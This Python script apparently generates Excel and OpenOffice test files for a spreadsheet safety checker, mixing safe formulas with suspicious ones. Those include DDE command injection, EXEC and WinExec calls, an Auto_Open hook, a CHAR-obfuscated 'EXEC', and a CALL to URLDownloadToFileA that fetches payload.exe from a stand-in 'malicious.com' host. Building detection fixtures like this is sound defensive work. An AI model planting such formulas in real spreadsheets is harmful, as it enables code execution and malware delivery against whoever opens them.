#!/usr/bin/env python3
"""
Create test Excel and OpenOffice files with various formulas for testing spreadsheet-safety-check.

This script creates example files with both safe and suspicious formulas for testing purposes.
"""

from pathlib import Path

from odf import namespaces
from odf.opendocument import OpenDocumentSpreadsheet
from odf.table import Table, TableCell, TableRow
from odf.text import P
from openpyxl import Workbook


def create_test_xlsx():
    """Create a test Excel file with safe and suspicious formulas."""
    wb = Workbook()
    ws = wb.active
    ws.title = "Test Sheet"

    # Add some safe formulas
    ws["A1"] = "Safe Formula"
    ws["A2"] = "=SUM(B1:B10)"
    ws["A3"] = "=AVERAGE(C1:C5)"
    ws["A4"] = '=IF(D1>10, "Yes", "No")'

    # Add some suspicious formulas
    ws["A6"] = "Suspicious Formulas"
    ws["A7"] = '=HYPERLINK("http://example.com", "Click here")'
    ws["A8"] = '=WEBSERVICE("http://api.example.com/data")'
    ws["A9"] = '=INDIRECT("A1")'

    # Add suspicious VBA-related cells
    ws["A11"] = "Suspicious VBA-Related"
    ws["A12"] = '=cmd|"/c calc.exe"!A1'  # DDE
    ws["A13"] = '=EXEC("calc.exe")'
    ws["A14"] = '=CALL("kernel32","WinExec","JJJ","calc.exe",1)'
    ws["A15"] = "=PERSONAL.XLSB!MyMacro()"
    ws["A16"] = '=REGISTER("user32","MessageBoxA","JJCCJ","MessageBox")'
    ws["A17"] = '=FILES("C:\\*.*")'

    # Add some data
    ws["B1"] = "Data"
    for i in range(2, 11):
        ws[f"B{i}"] = i * 10

    # Create another sheet
    ws2 = wb.create_sheet("Sheet2")
    ws2["A1"] = "Another Sheet"
    ws2["A2"] = '=FILTERXML(WEBSERVICE("http://example.com/xml"), "//data")'

    # More suspicious content
    ws2["A4"] = "More Suspicious Content"
    ws2["A5"] = (
        '=CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,'
        '"http://malicious.com/payload.exe","C:\\temp\\payload.exe",0,0)'
    )
    ws2["A6"] = '=REGISTER.ID("Auto_Open")'
    ws2["A7"] = "=GET.WORKSPACE(1)"
    ws2["A8"] = '=ALERT("This is a macro",2)'
    ws2["A9"] = "=CHAR(69)&CHAR(88)&CHAR(69)&CHAR(67)"  # Spells "EXEC"

    # Save the file
    output_file = Path(__file__).parent / "test_spreadsheet.xlsx"
    wb.save(output_file)
    print(f"✓ Test Excel file created: {output_file}")
    return output_file


def create_test_ods():
    """Create an OpenOffice spreadsheet with the same test cases."""
    doc = OpenDocumentSpreadsheet()

    # Create first sheet
    table1 = Table(name="Test Sheet")

    def add_cell(row, value):
        """Helper function to add a cell with text/formula."""
        cell = TableCell()
        if value and str(value).startswith("="):
            # Set as formula
            cell.setAttrNS(namespaces.TABLENS, "formula", "of:" + value)
            cell.setAttrNS(namespaces.OFFICENS, "value-type", "string")
        else:
            # Regular text cell
            cell.addElement(P(text=str(value) if value else ""))
        row.addElement(cell)

    # Add safe formulas
    for value in [
        "Safe Formula",
        "=SUM(B1:B10)",
        "=AVERAGE(C1:C5)",
        '=IF(D1>10,"Yes","No")',
        "",
        "Suspicious Formulas",
        '=HYPERLINK("http://example.com","Click here")',
        '=WEBSERVICE("http://api.example.com/data")',
        '=INDIRECT("A1")',
        "",
        "Suspicious VBA-Related",
        '=cmd|"/c calc.exe"!A1',
        '=EXEC("calc.exe")',
        '=CALL("kernel32","WinExec","JJJ","calc.exe",1)',
        "=PERSONAL.XLSB!MyMacro()",
        '=REGISTER("user32","MessageBoxA","JJCCJ","MessageBox")',
        '=FILES("C:\\*.*")',
    ]:
        row = TableRow()
        add_cell(row, value)
        table1.addElement(row)

    doc.spreadsheet.addElement(table1)

    # Create second sheet
    table2 = Table(name="Sheet2")

    for value in [
        "Another Sheet",
        '=FILTERXML(WEBSERVICE("http://example.com/xml"),"//data")',
        "",
        "More Suspicious Content",
        (
            '=CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,'
            '"http://malicious.com/payload.exe","C:\\temp\\payload.exe",0,0)'
        ),
        '=REGISTER.ID("Auto_Open")',
        "=GET.WORKSPACE(1)",
        '=ALERT("This is a macro",2)',
        "=CHAR(69)&CHAR(88)&CHAR(69)&CHAR(67)",
    ]:
        row = TableRow()
        add_cell(row, value)
        table2.addElement(row)

    doc.spreadsheet.addElement(table2)

    # Save the file
    output_file = Path(__file__).parent / "test_spreadsheet.ods"
    doc.save(output_file)
    print(f"✓ Test ODS file created: {output_file}")
    return output_file


def main():
    """Create both test files."""
    print("Creating test spreadsheet files...\n")
    xlsx_file = create_test_xlsx()
    ods_file = create_test_ods()

    print("\nTest files created successfully!")
    print("\nYou can now test the tool with:")
    print(f"  spreadsheet-safety-check {xlsx_file.name}")
    print(f"  spreadsheet-safety-check {ods_file.name}")


if __name__ == "__main__":
    main()
